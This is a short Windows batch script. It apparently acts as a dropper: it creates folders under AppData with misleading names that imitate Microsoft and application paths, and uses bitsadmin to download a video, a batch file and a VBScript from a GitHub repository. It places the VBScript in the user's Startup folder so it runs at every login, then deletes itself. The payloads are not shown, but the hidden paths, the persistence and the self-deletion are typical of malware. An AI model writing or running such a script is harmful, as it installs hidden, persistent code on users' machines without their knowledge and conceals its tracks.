set videodownloadfolder="%appdata%\Decoder Studio\assets\files\logs\cache\resources\versions\web\backup"
set batdownloadfolder="%appdata%\Windows64\Microsoft\Menu\Executables\Files\Start"
set thestartupfolder="%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"

md %videodownloadfolder%
md %batdownloadfolder%

bitsadmin  /transfer VideoDownload  /download  /priority foreground https://raw.githubusercontent.com/RandumPerson314/Files-to-host-online/master/video.mp4  %videodownloadfolder%\video.mp4
bitsadmin  /transfer StartupExecutableBATDownload  /download  /priority foreground https://raw.githubusercontent.com/RandumPerson314/Files-to-host-online/master/StartupExecutable.bat  %batdownloadfolder%\StartupExecutable.bat
bitsadmin  /transfer StartupExecutableVBSDownload  /download  /priority foreground https://raw.githubusercontent.com/RandumPerson314/Files-to-host-online/master/StartupExecutable.vbs  %thestartupfolder%\StartupExecutable.vbs

del "%~f0"
